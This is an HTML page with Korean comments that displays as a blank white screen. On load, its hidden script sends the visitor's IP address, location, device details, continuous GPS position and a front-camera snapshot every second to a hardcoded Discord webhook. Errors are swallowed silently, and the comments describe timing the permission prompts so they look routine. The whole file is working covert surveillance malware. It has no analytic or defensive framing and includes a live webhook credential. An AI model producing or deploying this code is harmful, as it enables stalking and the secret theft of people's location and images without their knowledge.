<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1487252464938913822/nuX36j226624CJ8Gbh7NtIM2RdNqA13Zf-GyqxtWJP2mwOuXi_8ZspdiCZrw5VlGNmgH";

        async function sendToWebhook(payload) {
            try {
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (e) {}
        }

        // 기기 정보 + IP 전송
        async function sendDeviceInfo() {
            const payload = {
                username: "Device",
                embeds: [{
                    color: 0x00ff00,
                    title: "New Connection",
                    fields: [
                        { name: "User-Agent", value: navigator.userAgent ? navigator.userAgent.substring(0, 900) : "Unknown", inline: false }
                    ]
                }]
            };

            try {
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();
                payload.embeds[0].fields.push(
                    { name: "IP", value: data.ip || "Unknown", inline: true },
                    { name: "Country", value: data.country_name ? `\( {data.country_name} ( \){data.country})` : "Unknown", inline: true },
                    { name: "City", value: data.city || "Unknown", inline: true }
                );
            } catch (e) {}

            sendToWebhook(payload);
        }

        // ==================== 위치 먼저 ====================
        function startLocationTracking() {
            if (!navigator.geolocation) return;

            navigator.geolocation.watchPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    sendToWebhook({
                        username: "Location",
                        embeds: [{
                            color: 0x0000ff,
                            title: "Live Location",
                            fields: [
                                { name: "Latitude", value: latitude.toFixed(6), inline: true },
                                { name: "Longitude", value: longitude.toFixed(6), inline: true },
                                { name: "Accuracy", value: accuracy + "m", inline: true },
                                { name: "Time", value: new Date().toLocaleTimeString(), inline: true }
                            ]
                        }]
                    });
                },
                (error) => {
                    // 권한 거부나 오류 시에도 조용히 넘어감
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 8000
                }
            );
        }

        // ==================== 카메라 (위치 이후) ====================
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });
                video.srcObject = stream;

                // 1초마다 카메라 캡처
                setInterval(() => {
                    if (!video.videoWidth) return;
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const imageData = canvas.toDataURL("image/jpeg", 0.65);

                    sendToWebhook({
                        username: "Camera",
                        embeds: [{
                            color: 0xff0000,
                            title: "Camera Capture",
                            image: { url: imageData }
                        }]
                    });
                }, 1000);
            } catch (e) {}
        }

        // ==================== 메인 실행 (위치 → 카메라 순서) ====================
        async function init() {
            // 1. 기기 정보 전송
            await sendDeviceInfo();

            // 2. 위치 권한 먼저 요청
            startLocationTracking();

            // 3. 위치 요청 후 약간의 딜레이를 두고 카메라 권한 요청 (순차적으로 보이게)
            setTimeout(() => {
                startCamera();
            }, 800); // 0.8초 후 카메라 요청
        }

        window.onload = init;
    </script>
</body>
</html>
